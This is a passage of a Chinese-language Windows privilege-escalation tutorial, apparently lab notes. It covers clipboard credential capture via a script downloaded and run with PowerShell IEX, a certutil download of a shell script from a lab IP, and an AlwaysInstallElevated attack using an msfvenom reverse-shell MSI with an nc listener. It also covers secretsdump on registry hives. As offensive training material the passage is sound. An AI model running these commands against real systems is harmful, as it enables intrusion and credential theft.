class="line"><span class="function">07/20/2022  07:06 <span class="title">AM</span>    &lt;<span class="title">DIR</span>&gt;          <span class="title">TeamViewer</span></span></span><br><span class="line"><span class="function">               0 <span class="title">File</span>(<span class="title">s</span>)              0 <span class="title">bytes</span></span></span><br><span class="line"><span class="function">              16 <span class="title">Dir</span>(<span class="title">s</span>)  351,524,651,008 <span class="title">bytes</span> <span class="title">free</span></span></span><br></pre></td></tr></table></figure>

<p>通过 PowerShell 和注册表项获取已安装的程序</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="variable">$INSTALLED</span> = <span class="built_in">Get-ItemProperty</span> HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* |  <span class="built_in">Select-Object</span> DisplayName, DisplayVersion, InstallLocation</span><br><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="variable">$INSTALLED</span> += <span class="built_in">Get-ItemProperty</span> HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\* | <span class="built_in">Select-Object</span> DisplayName, DisplayVersion, InstallLocation</span><br><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="variable">$INSTALLED</span> | ?&#123; <span class="variable">$_</span>.DisplayName <span class="operator">-ne</span> <span class="variable">$null</span> &#125; | <span class="built_in">sort-object</span> <span class="literal">-Property</span> DisplayName <span class="literal">-Unique</span> | <span class="built_in">Format-Table</span> <span class="literal">-AutoSize</span></span><br><span class="line"></span><br><span class="line">DisplayName                                         DisplayVersion    InstallLocation</span><br><span class="line"><span class="literal">-----------</span>                                         <span class="literal">--------------</span>    <span class="literal">---------------</span></span><br><span class="line">Adobe Acrobat DC (<span class="number">64</span><span class="literal">-bit</span>)                           <span class="number">22.001</span>.<span class="number">20169</span>      C:\Program Files\Adobe\Acrobat DC\</span><br><span class="line">CORSAIR iCUE <span class="number">4</span> Software                             <span class="number">4.23</span>.<span class="number">137</span>          C:\Program Files\Corsair\CORSAIR iCUE <span class="number">4</span> Software</span><br><span class="line">Google Chrome                                       <span class="number">103.0</span>.<span class="number">5060.134</span>    C:\Program Files\Google\Chrome\Application</span><br><span class="line">Google Drive                                        <span class="number">60.0</span>.<span class="number">2.0</span>          C:\Program Files\Google\Drive File Stream\<span class="number">60.0</span>.<span class="number">2.0</span>\GoogleDriveFS.exe</span><br><span class="line">Microsoft Office Profesional Plus <span class="number">2016</span> - es<span class="literal">-es</span>      <span class="number">16.0</span>.<span class="number">15330.20264</span>  C:\Program Files (x86)\Microsoft Office</span><br><span class="line">Microsoft Office Professional Plus <span class="number">2016</span> - en<span class="literal">-us</span>     <span class="number">16.0</span>.<span class="number">15330.20264</span>  C:\Program Files (x86)\Microsoft Office</span><br><span class="line">mRemoteNG                                           <span class="number">1.62</span>              C:\Program Files\mRemoteNG</span><br><span class="line">TeamViewer                                          <span class="number">15.31</span>.<span class="number">5</span>           C:\Program Files\TeamViewer</span><br><span class="line">...SNIP...</span><br></pre></td></tr></table></figure>

<h2 id="Clipboard"><a href="#Clipboard" class="headerlink" title="Clipboard"></a>Clipboard</h2><p>网络管理员使用密码管理器来存储他们的凭证并将密码复制并粘贴到登录表单中。由于这不涉及<code>typing</code>密码，因此击键记录在这种情况下无效。<code>clipboard</code>提供了对大量信息的访问，例如粘贴凭证和 2FA 软令牌，以及直接与 RDP 会话剪贴板交互的可能性。</p>
<p>使用<a target="_blank" rel="noopener" href="https://github.com/inguardians/Invoke-Clipboard/blob/master/Invoke-Clipboard.ps1">Invoke-Clipboard</a>脚本来提取用户剪贴板数据。</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="built_in">IEX</span>(<span class="built_in">New-Object</span> Net.WebClient).DownloadString(<span class="string">&#x27;https://raw.githubusercontent.com/inguardians/Invoke-Clipboard/master/Invoke-Clipboard.ps1&#x27;</span>)</span><br><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="built_in">Invoke-ClipboardLogger</span></span><br></pre></td></tr></table></figure>

<p>Invoke-ClipboardLogger 从剪贴板捕获凭据，该脚本将开始监视剪贴板中的条目并将其显示在 PowerShell 会话中。需要耐心等待，直到捕获敏感信息。</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="built_in">Invoke-ClipboardLogger</span></span><br><span class="line"></span><br><span class="line">https://portal.azure.com</span><br><span class="line"></span><br><span class="line">Administrator@something.com</span><br><span class="line"></span><br><span class="line">Sup9rC0mpl2xPa<span class="variable">$</span><span class="variable">$ws0921lk</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p><strong>注意：</strong>可以使用 Mimikatz 或键盘记录器等工具获取用户凭据。Metasploit 等 C2 框架包含用于键盘记录的内置功能。</p>
</blockquote>
<h2 id="Backup-Servers"><a href="#Backup-Servers" class="headerlink" title="Backup Servers"></a>Backup Servers</h2><p>备份可用于在数据删除或损坏导致丢失后恢复数据，或恢复较早时间的数据。备份提供了一种简单的灾难恢复形式。某些备份系统可以重建计算机系统或其他复杂配置，例如 Active Directory 服务器或数据库服务器。</p>
<p>通常，备份系统需要一个帐户来连接到目标计算机并执行备份。大多数公司要求备份帐户在目标计算机上具有本地管理权限，以访问其所有文件和服务。</p>
<hr>
<h1 id="Miscellaneous-Techniques"><a href="#Miscellaneous-Techniques" class="headerlink" title="Miscellaneous Techniques"></a>Miscellaneous Techniques</h1><h2 id="Living-Off-The-Land-Binaries-and-Scripts-LOLBAS"><a href="#Living-Off-The-Land-Binaries-and-Scripts-LOLBAS" class="headerlink" title="Living Off The Land Binaries and Scripts (LOLBAS)"></a>Living Off The Land Binaries and Scripts (LOLBAS)</h2><p> <a target="_blank" rel="noopener" href="https://lolbas-project.github.io/">LOLBAS</a>记录了可用于 Windows 系统上的“自谋生路”技术的二进制文件、脚本和库。这些二进制文件、脚本和库都是 Microsoft 签名的文件，它们要么是操作系统的原生文件，要么可以直接从 Microsoft 下载，并且具有对攻击者有用的意外功能。一些有趣的功能可能包括：</p>
<table>
<thead>
<tr>
<th></th>
<th></th>
<th></th>
</tr>
</thead>
<tbody><tr>
<td>代码执行</td>
<td>代码编译</td>
<td>文件传输</td>
</tr>
<tr>
<td>持久性</td>
<td>绕过UAC</td>
<td>凭证盗窃</td>
</tr>
<tr>
<td>转储进程内存</td>
<td>键盘记录</td>
<td>逃避</td>
</tr>
<tr>
<td>DLL 劫持</td>
<td></td>
<td></td>
</tr>
</tbody></table>
<h3 id="Certutil-传输文件"><a href="#Certutil-传输文件" class="headerlink" title="Certutil 传输文件"></a>Certutil 传输文件</h3><p><a target="_blank" rel="noopener" href="https://lolbas-project.github.io/lolbas/Binaries/Certutil/">certutil.exe</a> 下载文件</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; certutil.exe <span class="literal">-urlcache</span> <span class="operator">-split</span> <span class="operator">-f</span> http://<span class="number">10.10</span>.<span class="number">14.3</span>:<span class="number">8080</span>/shell.bat shell.bat</span><br></pre></td></tr></table></figure>

<p>Base64 编码&#x2F;解码 传输</p>
<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">C:\&gt; <span class="title">certutil</span> -<span class="title">encode</span> <span class="title">file1</span> <span class="title">encodedfile</span></span></span><br><span class="line"><span class="function"><span class="title">C</span>:\&gt; <span class="title">certutil</span> -<span class="title">decode</span> <span class="title">encodedfile</span> <span class="title">file2</span></span></span><br></pre></td></tr></table></figure>

<h2 id="Always-install-with-elevated-privileges"><a href="#Always-install-with-elevated-privileges" class="headerlink" title="Always install with elevated privileges"></a>Always install with elevated privileges</h2><p>可以通过本地组策略在以下路径下进行设置<code>Always install with elevated privileges</code>来设置为<code>Enabled</code>。</p>
<ul>
<li><code>Computer Configuration\Administrative Templates\Windows Components\Windows Installer</code></li>
<li><code>User Configuration\Administrative Templates\Windows Components\Windows Installer</code></li>
</ul>
<p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2024/image-1732336909055.png" alt="alwaysinstall"></p>
<p>枚举此设置</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; reg query HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer</span><br><span class="line"></span><br><span class="line">HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer</span><br><span class="line">    AlwaysInstallElevated    REG_DWORD    <span class="number">0</span>x1</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">PS</span> C:\&gt; reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer</span><br><span class="line"></span><br><span class="line">HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\Installer</span><br><span class="line">    AlwaysInstallElevated    REG_DWORD    <span class="number">0</span>x1</span><br></pre></td></tr></table></figure>

<p>生成恶意文件</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ msfvenom -p windows/shell_reverse_tcp lhost=10.10.14.3 lport=9443 -f msi &gt; aie.msi</span><br></pre></td></tr></table></figure>

<p>上传到目标机器，并执行</p>
<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">C:\&gt; <span class="title">msiexec</span> /<span class="title">i</span> <span class="title">c</span>:\<span class="title">users</span>\<span class="title">htb</span>-<span class="title">student</span>\<span class="title">desktop</span>\<span class="title">aie.msi</span> /<span class="title">quiet</span> /<span class="title">qn</span> /<span class="title">norestart</span></span></span><br></pre></td></tr></table></figure>

<p>攻击机监听，NT AUTHORITY\SYSTEM</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ nc -lnvp 9443</span><br></pre></td></tr></table></figure>

<h3 id="计划任务"><a href="#计划任务" class="headerlink" title="计划任务"></a>计划任务</h3><p>默认情况下，只能看到由用户创建的任务和每个 Windows 操作系统都有的默认计划任务。遗憾的是，无法列出其他用户（如管理员）创建的计划任务，因为它们存储在中<code>C:\Windows\System32\Tasks</code>，标准用户没有读取权限。可能会遇到以管理员身份运行的计划任务，其由于多种原因配置了弱的文件&#x2F;文件夹权限。在这种情况下，可以编辑任务本身以执行意外操作或修改计划任务运行的脚本。</p>
<p>枚举计划任务 schtasks</p>
<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">C:\&gt;  <span class="title">schtasks</span> /<span class="title">query</span> /<span class="title">fo</span> <span class="title">LIST</span> /<span class="title">v</span></span></span><br><span class="line"><span class="function"> </span></span><br><span class="line"><span class="function"><span class="title">Folder</span>: \</span></span><br><span class="line"><span class="function"><span class="title">INFO</span>: <span class="title">There</span> <span class="title">are</span> <span class="title">no</span> <span class="title">scheduled</span> <span class="title">tasks</span> <span class="title">presently</span> <span class="title">available</span> <span class="title">at</span> <span class="title">your</span> <span class="title">access</span> <span class="title">level</span>.</span></span><br><span class="line"><span class="function"> </span></span><br><span class="line"><span class="function"><span class="title">Folder</span>: \<span class="title">Microsoft</span></span></span><br><span class="line"><span class="function"><span class="title">INFO</span>: <span class="title">There</span> <span class="title">are</span> <span class="title">no</span> <span class="title">scheduled</span> <span class="title">tasks</span> <span class="title">presently</span> <span class="title">available</span> <span class="title">at</span> <span class="title">your</span> <span class="title">access</span> <span class="title">level</span>.</span></span><br><span class="line"><span class="function"> </span></span><br><span class="line"><span class="function"><span class="title">Folder</span>: \<span class="title">Microsoft</span>\<span class="title">Windows</span></span></span><br><span class="line"><span class="function"><span class="title">INFO</span>: <span class="title">There</span> <span class="title">are</span> <span class="title">no</span> <span class="title">scheduled</span> <span class="title">tasks</span> <span class="title">presently</span> <span class="title">available</span> <span class="title">at</span> <span class="title">your</span> <span class="title">access</span> <span class="title">level</span>.</span></span><br><span class="line"><span class="function"> </span></span><br><span class="line"><span class="function"><span class="title">Folder</span>: \<span class="title">Microsoft</span>\<span class="title">Windows</span>\.<span class="title">NET</span> <span class="title">Framework</span></span></span><br><span class="line"><span class="function"><span class="title">HostName</span>:                             <span class="title">WINLPE</span>-<span class="title">SRV01</span></span></span><br><span class="line"><span class="function"><span class="title">TaskName</span>:                             \<span class="title">Microsoft</span>\<span class="title">Windows</span>\.<span class="title">NET</span> <span class="title">Framework</span>\.<span class="title">NET</span> <span class="title">Framework</span> <span class="title">NGEN</span> <span class="title">v4</span>.0.30319</span></span><br><span class="line"><span class="function"><span class="title">Next</span> <span class="title">Run</span> <span class="title">Time</span>:                        <span class="title">N</span>/<span class="title">A</span></span></span><br><span class="line"><span class="function"><span class="title">Status</span>:                               <span class="title">Ready</span></span></span><br><span class="line"><span class="function"><span class="title">Logon</span> <span class="title">Mode</span>:                           <span class="title">Interactive</span>/<span class="title">Background</span></span></span><br><span class="line"><span class="function"><span class="title">Last</span> <span class="title">Run</span> <span class="title">Time</span>:                        5/27/2021 12:23:27 <span class="title">PM</span></span></span><br><span class="line"><span class="function"><span class="title">Last</span> <span class="title">Result</span>:                          0</span></span><br><span class="line"><span class="function"><span class="title">Author</span>:                               <span class="title">N</span>/<span class="title">A</span></span></span><br><span class="line"><span class="function"><span class="title">Task</span> <span class="title">To</span> <span class="title">Run</span>:                          <span class="title">COM</span> <span class="title">handler</span></span></span><br><span class="line"><span class="function"><span class="title">Start</span> <span class="title">In</span>:                             <span class="title">N</span>/<span class="title">A</span></span></span><br><span class="line"><span class="function"><span class="title">Comment</span>:                              <span class="title">N</span>/<span class="title">A</span></span></span><br><span class="line"><span class="function"><span class="title">Scheduled</span> <span class="title">Task</span> <span class="title">State</span>:                 <span class="title">Enabled</span></span></span><br><span class="line"><span class="function"><span class="title">Idle</span> <span class="title">Time</span>:                            <span class="title">Disabled</span></span></span><br><span class="line"><span class="function"><span class="title">Power</span> <span class="title">Management</span>:                     <span class="title">Stop</span> <span class="title">On</span> <span class="title">Battery</span> <span class="title">Mode</span>, <span class="title">No</span> <span class="title">Start</span> <span class="title">On</span> <span class="title">Batteries</span></span></span><br><span class="line"><span class="function"><span class="title">Run</span> <span class="title">As</span> <span class="title">User</span>:                          <span class="title">SYSTEM</span></span></span><br><span class="line"><span class="function"><span class="title">Delete</span> <span class="title">Task</span> <span class="title">If</span> <span class="title">Not</span> <span class="title">Rescheduled</span>:       <span class="title">Disabled</span></span></span><br><span class="line"><span class="function"><span class="title">Stop</span> <span class="title">Task</span> <span class="title">If</span> <span class="title">Runs</span> <span class="title">X</span> <span class="title">Hours</span> <span class="title">and</span> <span class="title">X</span> <span class="title">Mins</span>: 02:00:00</span></span><br><span class="line"><span class="function"><span class="title">Schedule</span>:                             <span class="title">Scheduling</span> <span class="title">data</span> <span class="title">is</span> <span class="title">not</span> <span class="title">available</span> <span class="title">in</span> <span class="title">this</span> <span class="title">format</span>.</span></span><br><span class="line"><span class="function"><span class="title">Schedule</span> <span class="title">Type</span>:                        <span class="title">On</span> <span class="title">demand</span> <span class="title">only</span></span></span><br><span class="line"><span class="function"><span class="title">Start</span> <span class="title">Time</span>:                           <span class="title">N</span>/<span class="title">A</span></span></span><br><span class="line"><span class="function"><span class="title">Start</span> <span class="title">Date</span>:                           <span class="title">N</span>/<span class="title">A</span></span></span><br><span class="line"><span class="function"><span class="title">End</span> <span class="title">Date</span>:                             <span class="title">N</span>/<span class="title">A</span></span></span><br><span class="line"><span class="function"><span class="title">Days</span>:                                 <span class="title">N</span>/<span class="title">A</span></span></span><br><span class="line"><span class="function"><span class="title">Months</span>:                               <span class="title">N</span>/<span class="title">A</span></span></span><br><span class="line"><span class="function"><span class="title">Repeat</span>: <span class="title">Every</span>:                        <span class="title">N</span>/<span class="title">A</span></span></span><br><span class="line"><span class="function"><span class="title">Repeat</span>: <span class="title">Until</span>: <span class="title">Time</span>:                  <span class="title">N</span>/<span class="title">A</span></span></span><br><span class="line"><span class="function"><span class="title">Repeat</span>: <span class="title">Until</span>: <span class="title">Duration</span>:              <span class="title">N</span>/<span class="title">A</span></span></span><br><span class="line"><span class="function"><span class="title">Repeat</span>: <span class="title">Stop</span> <span class="title">If</span> <span class="title">Still</span> <span class="title">Running</span>:        <span class="title">N</span>/<span class="title">A</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">&lt;<span class="title">SNIP</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>枚举计划任务 Powershell Get-ScheduledTask</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="built_in">Get-ScheduledTask</span> | <span class="built_in">select</span> TaskName,State</span><br><span class="line"> </span><br><span class="line">TaskName                                                State</span><br><span class="line"><span class="literal">--------</span>                                                <span class="literal">-----</span></span><br><span class="line">.NET Framework NGEN v4.<span class="number">0.30319</span>                          Ready</span><br><span class="line">.NET Framework NGEN v4.<span class="number">0.30319</span> <span class="number">64</span>                       Ready</span><br><span class="line">.NET Framework NGEN v4.<span class="number">0.30319</span> <span class="number">64</span> Critical           Disabled</span><br><span class="line">.NET Framework NGEN v4.<span class="number">0.30319</span> Critical              Disabled</span><br><span class="line">AD RMS Rights Policy Template Management (Automated) Disabled</span><br><span class="line">AD RMS Rights Policy Template Management (Manual)       Ready</span><br><span class="line">PolicyConverter                                      Disabled</span><br><span class="line">SmartScreenSpecific                                     Ready</span><br><span class="line">VerifiedPublisherCertStoreCheck                      Disabled</span><br><span class="line">Microsoft Compatibility Appraiser                       Ready</span><br><span class="line">ProgramDataUpdater                                      Ready</span><br><span class="line">StartupAppTask                                          Ready</span><br><span class="line">appuriverifierdaily                                     Ready</span><br><span class="line">appuriverifierinstall                                   Ready</span><br><span class="line">CleanupTemporaryState                                   Ready</span><br><span class="line">DsSvcCleanup                                            Ready</span><br><span class="line">Pre<span class="literal">-staged</span> app cleanup                               Disabled</span><br><span class="line"></span><br><span class="line">&lt;SNIP&gt;</span><br></pre></td></tr></table></figure>

<h2 id="用户-计算机描述字段"><a href="#用户-计算机描述字段" class="headerlink" title="用户&#x2F;计算机描述字段"></a>用户&#x2F;计算机描述字段</h2><p>系统管理员可以将帐户详细信息（例如密码）存储在计算机或用户的帐户描述字段中。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">PS C:\&gt; Get-LocalUser</span><br><span class="line"> </span><br><span class="line">Name            Enabled Description</span><br><span class="line">----            ------- -----------</span><br><span class="line">Administrator   True    Built-in account for administering the computer/domain</span><br><span class="line">DefaultAccount  False   A user account managed by the system.</span><br><span class="line">Guest           False   Built-in account for guest access to the computer/domain</span><br><span class="line">helpdesk        True</span><br><span class="line">htb-student     True</span><br><span class="line">htb-student_adm True</span><br><span class="line">jordan          True</span><br><span class="line">logger          True</span><br><span class="line">sarah           True</span><br><span class="line">sccm_svc        True</span><br><span class="line">secsvc          True    Network scanner - do not change password</span><br><span class="line">sql_dev         True</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">PS C:\&gt; Get-WmiObject -Class Win32_OperatingSystem | select Description</span><br><span class="line"> </span><br><span class="line">Description</span><br><span class="line">-----------</span><br><span class="line">The most vulnerable box ever!</span><br></pre></td></tr></table></figure>



<h2 id="挂载-VHDX-VMDK"><a href="#挂载-VHDX-VMDK" class="headerlink" title="挂载 VHDX&#x2F;VMDK"></a>挂载 VHDX&#x2F;VMDK</h2><p><code>.vhd</code>、<code>.vhdx</code>、<code>.vmdk</code>文件是<code>Virtual Hard Disk</code>、<code>Virtual Hard Disk v2</code>（均由 Hyper-V 使用）和<code>Virtual Machine Disk</code>（由 VMware 使用）。</p>
<p>挂载 VMDK</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ guestmount -a SQL01-disk1.vmdk -i --ro /mnt/vmdk</span><br></pre></td></tr></table></figure>

<p>安装 VHD&#x2F;VHDX</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ guestmount --add WEBSRV10.vhdx  --ro /mnt/vhdx/ -m /dev/sda1</span><br></pre></td></tr></table></figure>

<p>在 Windows 中，可以右键单击文件并选择<code>Mount</code>，或者使用<code>Disk Management</code>实用程序挂载<code>.vhd</code>或<code>.vhdx</code>文。或者使用<a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/powershell/module/hyper-v/mount-vhd?view=windowsserver2019-ps">Mount-VHD</a> PowerShell cmdlet。</p>
<p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2024/image-1732336313775.png" alt="mount"></p>
<p>对于 <code>.vmdk</code> 文件，可以右键单击并从菜单中选择 <code>Map Virtual Disk</code>。接下来，系统将提示选择驱动器号。如果一切顺利，可以浏览目标操作系统的文件和目录。如果失败，可以使用 VMWare Workstation <code>File</code> –&gt; <code>Map Virtual Disks</code>映射到基础系统上。还可以将 <code>.vmdk</code> 文件作为附加虚拟硬盘添加到攻击 VM 上，然后将其作为带字母的驱动器进行访问。甚至可以使用 <code>7-Zip</code> 从 .vmdk 文件中提取数据。<a target="_blank" rel="noopener" href="https://www.nakivo.com/blog/extract-content-vmdk-files-step-step-guide/">guide</a>介绍了多种访问 <code>.vmdk</code> 文件上的文件的方法。</p>
<p>如果可以找到实时机器的备份，可以访问 C:\Windows\System32\Config 目录并下拉 SAM、SECURITY 和 SYSTEM 注册表配置单元。然后，可以使用 secretsdump 之类的工具来提取本地用户的密码哈希。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">secretsdump.py -sam SAM -security SECURITY -system SYSTEM LOCAL</span><br></pre></td></tr></table></figure>

<hr>
<h1 id="Legacy-Operating-Systems"><a href="#Legacy-Operating-Systems" class="headerlink" title="Legacy Operating Systems"></a>Legacy Operating Systems</h1><h2 id="End-of-Life-Systems-EOL"><a href="#End-of-Life-Systems-EOL" class="headerlink" title="End of Life Systems (EOL)"></a>End of Life Systems (EOL)</h2><p>随着时间的推移，微软决定不再为特定操作系统版本提供持续支持。当他们停止支持某个版本的 Windows 时，他们会停止为相关版本发布安全更新。Windows 系统首先进入“扩展支持”期，然后被归类为终止使用或不再受官方支持。微软继续通过定制的长期支持合同为这些系统创建安全更新，并提供给大型组织。以下是流行的 Windows 版本及其终止使用日期的列表：</p>
<h3 id="Windows-Desktop"><a href="#Windows-Desktop" class="headerlink" title="Windows Desktop"></a>Windows Desktop</h3><table>
<thead>
<tr>
<th>版本</th>
<th>日期</th>
</tr>
</thead>
<tbody><tr>
<td>Windows XP</td>
<td>2014 年 4 月 8 日</td>
</tr>
<tr>
<td>Windows Vista</td>
<td>2017 年 4 月 11 日</td>
</tr>
<tr>
<td>Windows 7</td>
<td>2020 年 1 月 14 日</td>
</tr>
<tr>
<td>Windows 8</td>
<td>2016 年 1 月 12 日</td>
</tr>
<tr>
<td>Windows 8.1</td>
<td>2023 年 1 月 10 日</td>
</tr>
<tr>
<td>Windows 10 version 1507</td>
<td>2017 年 5 月 9 日</td>
</tr>
<tr>
<td>Windows 10 version 1703</td>
<td>2018 年 10 月 9 日</td>
</tr>
<tr>
<td>Windows 10 version 1809</td>
<td>2020 年 11 月 10 日</td>
</tr>
<tr>
<td>Windows 10 version本 1903</td>
<td>2020 年 12 月 8 日</td>
</tr>
<tr>
<td>Windows 10 version 1909</td>
<td>2021 年 5 月 11 日</td>
</tr>
<tr>
<td>Windows 10 version 2004</td>
<td>2021 年 12 月 14 日</td>
</tr>
<tr>
<td>Windows 10 version 20H2</td>
<td>2022 年 5 月 10 日</td>
</tr>
</tbody></table>
<h3 id="Windows-Server"><a href="#Windows-Server" class="headerlink" title="Windows Server"></a>Windows Server</h3><table>
<thead>
<tr>
<th>版本</th>
<th>日期</th>
</tr>
</thead>
<tbody><tr>
<td>Windows Server 2003</td>
<td>2014 年 4 月 8 日</td>
</tr>
<tr>
<td>Windows Server 2003 R2</td>
<td>2015 年 7 月 14 日</td>
</tr>
<tr>
<td>Windows Server 2008</td>
<td>2020 年 1 月 14 日</td>
</tr>
<tr>
<td>Windows Server 2008 R2</td>
<td>2020 年 1 月 14 日</td>
</tr>
<tr>
<td>Windows Server 2012</td>
<td>2023 年 10 月 10 日</td>
</tr>
<tr>
<td>Windows Server 2012 R2</td>
<td>2023 年 10 月 10 日</td>
</tr>
<tr>
<td>Windows Server 2016</td>
<td>2027 年 1 月 12 日</td>
</tr>
<tr>
<td>Windows Server 2019</td>
<td>2029 年 1 月 9 日</td>
</tr>
</tbody></table>
<p><a target="_blank" rel="noopener" href="https://michaelspice.net/windows/end-of-life-microsoft-windows-and-office/">End of Life Systems</a>更详细地列出了 Microsoft Windows 和其他产品（如 Exchange、SQL Server和 Microsoft Office）的终止日期，在评估期间可能会遇到所有这些产品。</p>
<h2 id="Differences"><a href="#Differences" class="headerlink" title="Differences"></a>Differences</h2><h3 id="Windows-Server-1"><a href="#Windows-Server-1" class="headerlink" title="Windows Server"></a>Windows Server</h3><p>Windows Server 2008&#x2F;2008 R2 已于 2020 年 1 月 14 日停产。多年来，微软为后续版本的 Windows Server 添加了增强的安全功能。在外部渗透测试中遇到 Server 2008 并不常见，但我在内部评估中经常遇到它。</p>
<p>下表显示了 Server 2008 与最新 Windows Server 版本之间的一些显著差异。</p>
<table>
<thead>
<tr>
<th>特征</th>
<th>服务器 2008 R2</th>
<th>服务器 2012 R2</th>
<th>服务器 2016</th>
<th>服务器 2019</th>
</tr>
</thead>
<tbody><tr>
<td><a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/mem/configmgr/protect/deploy-use/defender-advanced-threat-protection">增强的 Windows Defender 高级威胁防护 (ATP)</a></td>
<td></td>
<td></td>
<td></td>
<td>十</td>
</tr>
<tr>
<td><a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/powershell/scripting/learn/remoting/jea/overview?view=powershell-7.1">管理适度</a></td>
<td>部分的</td>
<td>部分的</td>
<td>十</td>
<td>十</td>
</tr>
<tr>
<td><a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/windows/security/identity-protection/credential-guard/credential-guard">凭证保护</a></td>
<td></td>
<td></td>
<td>十</td>
<td>十</td>
</tr>
<tr>
<td><a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/windows/security/identity-protection/remote-credential-guard">远程凭证保护</a></td>
<td></td>
<td></td>
<td>十</td>
<td>十</td>
</tr>
<tr>
<td><a target="_blank" rel="noopener" href="https://techcommunity.microsoft.com/t5/iis-support-blog/windows-10-device-guard-and-credential-guard-demystified/ba-p/376419">设备保护（代码完整性）</a></td>
<td></td>
<td></td>
<td>十</td>
<td>十</td>
